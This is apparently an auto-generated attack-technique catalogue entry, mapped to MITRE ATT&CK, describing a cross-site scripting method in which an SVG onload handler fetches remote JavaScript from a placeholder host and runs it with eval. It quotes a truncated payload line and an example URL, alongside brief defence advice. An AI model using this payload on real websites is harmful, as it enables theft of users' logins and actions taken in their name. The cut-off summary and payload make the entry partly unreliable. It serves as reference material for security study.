---
id: 198899d2-ca12-4671-885e-b8f170bc8b51
name: Remote JavaScript Injection via SVG Onload Fetch Command
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:41.848646+00:00'
updated_at: '2023-04-10T20:21:40.207020+00:00'
tactics:
- '[[Initial Access|TA0001 - Initial Access]]'
techniques:
- '[[Drive-by Compromise|T1189 - Drive-by Compromise]]'
- '[[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]'
tags:
- '[[Cross Site Scripting]]'
- '[[XSS in HTML/Applications]]'
- '[[XSS using a remote JS]]'
---

# Remote JavaScript Injection via SVG Onload Fetch Command

## Summary

Remote JavaScript Injection via SVG Onload Fetch Command is a type of cross-site scripting (XSS) vulnerability that allows an attacker to inject malicious JavaScript code into a web page. This vulnerability can be exploited by an attacker to steal sensitive user information, such as login credentia

## Description

# Description

Remote JavaScript Injection via SVG Onload Fetch Command is a type of cross-site scripting (XSS) vulnerability that allows an attacker to inject malicious JavaScript code into a web page. This vulnerability can be exploited by an attacker to steal sensitive user information, such as login credentials, or to perform actions on behalf of the user, such as making unauthorized transactions. The attacker can inject remote JavaScript code into a web page by using the SVG Onload Fetch Command, which allows the attacker to load a remote JavaScript file into the victim's browser.

## Requirements

1. Access to a vulnerable web application

## Defense

1. Implement input validation and output encoding to prevent XSS attacks

1. Implement Content Security Policy (CSP) to restrict the sources of content that can be loaded on a web page

1. Regularly scan web applications for vulnerabilities and apply security patches as needed

## Objectives

1. Inject malicious JavaScript code into a web page

1. Steal sensitive user information

1. Perform actions on behalf of the user

# Instructions

1. This command is used to execute arbitrary code on a target website by exploiting a vulnerability in SVG images. The command fetches a payload from a specified URL and then evaluates it using the eval() function. The payload can be specified in the URL by adding /#payload after the URL. For example, 14.rs/#alert(document.domain) will execute an alert with the domain of the target website.

**Code**: [[<svg/onload='fetch("//host/a").then(r=>r.text().th]]

> The command has the following arguments:
- URL: The URL from which the payload will be fetched. This argument is required.
- Payload: The payload to be executed on the target website. This argument is optional and can be specified in the URL by adding /#payload after the URL.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access|TA0001 - Initial Access]]

### Techniques

- [[Drive-by Compromise|T1189 - Drive-by Compromise]]
- [[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]

## Tags

- [[Cross Site Scripting]]
- [[XSS in HTML/Applications]]
- [[XSS using a remote JS]]
